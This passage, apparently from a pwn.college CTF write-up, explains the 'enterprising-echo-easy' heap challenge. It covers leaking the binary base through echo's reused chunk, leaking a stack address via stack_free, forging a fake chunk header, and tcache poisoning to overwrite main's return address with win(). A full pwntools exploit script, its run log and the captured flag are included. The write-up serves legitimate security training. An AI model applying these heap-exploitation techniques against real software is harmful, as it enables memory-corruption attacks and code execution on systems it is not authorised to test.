  unsigned __int64 v5;

  v5 = __readfsqword(0x28u);
  argv = (char **)malloc(0x20u);
  *argv = "/bin/echo";       // argv[0] = binary address (rodata)
  argv[1] = "Data: ";        // argv[1] = binary address (rodata)
  argv[2] = (char *)(a1 + a2);
  argv[3] = nullptr;
  if ( !fork() )
  {
    execve(*argv, argv, nullptr);
    exit(0);
  }
  wait(0);
  return __readfsqword(0x28u) ^ v5;
}
```

This challenge combines the echo emanations and stack spoofing techniques. There is no `send_flag` or secret to leak, the goal is to overwrite `main`'s return address with `win()`.

We have two useful primitives. First, the `echo` command's internal `malloc(0x20)` can be exploited just like in echo emanations to leak a binary address. Second, `stack_free` prints `v15`'s address and frees it into the tcache, giving us both a stack leak and a chunk we can use for tcache poisoning.

### Binary Leak via Echo's Internal Chunk

In echo emanations, `argv[1]` pointed to `v4`, a local stack variable holding `"Data:"`. In this binary, `"Data:"` is stored as a global string in rodata instead, so offset 8 gives another binary address rather than a stack address. We only get one useful leak from echo, the binary base from `argv[0]` at offset 0.

```
nm /challenge/enterprising-echo-easy | grep -E "main|win"
# 0000000000001bc2 T main
# 0000000000001a22 T win

python3 -c "
data = open('/challenge/enterprising-echo-easy', 'rb').read()
print(hex(data.find(b'/bin/echo')))
"
# 0x33f8
```

So:
```
base     = bin_leak - 0x33f8
win_addr = base + 0x1a22
```

### Stack Leak via stack_free

Since echo does not give us a stack address, we use `stack_free` instead. It prints `v15`'s address before freeing it. `v15` is at `[rbp-0x50]`, so:

```
rbp      = v15_addr + 0x50
ret_addr = rbp + 0x8 = v15_addr + 0x58
```

But `stack_free` will abort with `munmap_chunk(): invalid pointer` unless `v15` has a valid size field at `v15-0x8`. We use `stack_scanf` to forge one first. `v14` is at `[rbp-0x90]` and `v15-0x8` is at `[rbp-0x58]`, which is 56 bytes into `v14`. We write 56 bytes of padding followed by `p64(0x81)` (128 bytes with PREV_INUSE set, matching `malloc(128)` which we use for the poisoning).

### Tcache Poisoning to Overwrite the Return Address

After `stack_free`, `v15` is in the tcache with count=1. We then free two heap chunks of size 128 on top, making count=3 with the chain `a -> b -> v15`. We poison `a`'s `next` to `ret_addr`, orphaning `b` and `v15`. The chain becomes `a -> ret_addr` with count=3.

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  tcache_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┓                                        ┊
┊    counts: ┃ count_128: 3   ┃                                        ┊
┊            ┣━━━━━━━━━━━━━━━━┫                                        ┊
┊   entries: ┃ entry_128: &A  ┃                                        ┊
┊            ┗━━━━━━━━━━━━━━━━┛                                        ┊
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                          │
        ╭─────────────────╯
        │
        v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  tcache_entry A  ┆
├──────────────────┤
│ next: ret_addr   │ ────╮  (B and v15 orphaned)
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
        ╭────────────────╯
        │
        v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  STACK (ret_addr)        ┆
├──────────────────────────┤
│  main's return address   │
└──────────────────────────┘
```

Then:
- `malloc(0)` pops `A`, count=2, head=`ret_addr`
- `malloc(1)` count=2 so tcache used, pops `ret_addr`, count=1
- `scanf(1, p64(win_addr))` overwrites the return address with `win`
- `quit` triggers `main`'s return, jumping to `win()`

### Exploit

```python title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/enterprising-echo-easy")

p.recvuntil(b"quit): ")

def malloc(idx, size):
    p.sendline(b"malloc")
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    p.recvuntil(b"quit): ")

def free(idx):
    p.sendline(b"free")
    p.sendline(str(idx).encode())
    p.recvuntil(b"quit): ")

def echo_raw(idx, offset):
    p.sendline(b"echo")
    p.sendline(str(idx).encode())
    p.sendline(str(offset).encode())
    p.recvuntil(b"Data: ")
    data = p.recvuntil(b"\n", drop=True)
    p.recvuntil(b"quit): ")
    return data

def scanf(idx, data):
    p.sendline(b"scanf")
    p.sendline(str(idx).encode())
    p.sendline(data)
    p.recvuntil(b"quit): ")

# binary leak via echo chunk reuse
malloc(0, 32)
free(0)
echo_raw(0, 0)
bin_leak = echo_raw(0, 0).ljust(8, b"\x00")[:8]
bin_addr = u64(bin_leak)
base     = bin_addr - 0x33f8
win_addr = base + 0x1a22
print(f"[*] base:     {hex(base)}")
print(f"[*] win:      {hex(win_addr)}")

# forge fake chunk header at v15-0x8 (56 bytes into v14)
p.sendline(b"stack_scanf")
p.sendline(b"A" * 56 + p64(0x81))
p.recvuntil(b"quit): ")

# stack_free puts v15 into tcache (count=1), leak its address
p.sendline(b"stack_free")
p.recvuntil(b"free(")
v15_addr = int(p.recvuntil(b")").strip(b")"), 16)
rbp      = v15_addr + 0x50
ret_addr = rbp + 0x8
print(f"[*] v15:      {hex(v15_addr)}")
print(f"[*] rbp:      {hex(rbp)}")
print(f"[*] ret_addr: {hex(ret_addr)}")
p.recvuntil(b"quit): ")

# free two heap chunks on top of v15: count=3, chain=a->b->v15
malloc(0, 128)
malloc(1, 128)
free(1)
free(0)

# poison a's next to ret_addr: chain=a->ret_addr, count=3
scanf(0, p64(ret_addr))

# malloc(0) pops a, count=2, head=ret_addr
malloc(0, 128)
# malloc(1) pops ret_addr, count=1
malloc(1, 128)
# overwrite return address with win
scanf(1, p64(win_addr))

p.sendline(b"quit")
print(p.recvall().decode())
```

```
hacker@dynamic-allocator-misuse~enterprising-echo-easy:/$ python ~/script.py 
[+] Starting local process '/challenge/enterprising-echo-easy': pid 24642
[*] base:     0x58bbd3665000
[*] win:      0x58bbd3666a22
[*] v15:      0x7fff3d4a7270
[*] rbp:      0x7fff3d4a72c0
[*] ret_addr: 0x7fff3d4a72c8
[+] Receiving all data: Done (101B)
[*] Process '/challenge/enterprising-echo-easy' stopped with exit code -11 (SIGSEGV) (pid 24642)

### Goodbye!
You win! Here is your flag:
pwn.college{cLzcd_6TOaMPcuAj43NM-8jtBDS.01N5MDL4ITM0EzW}
```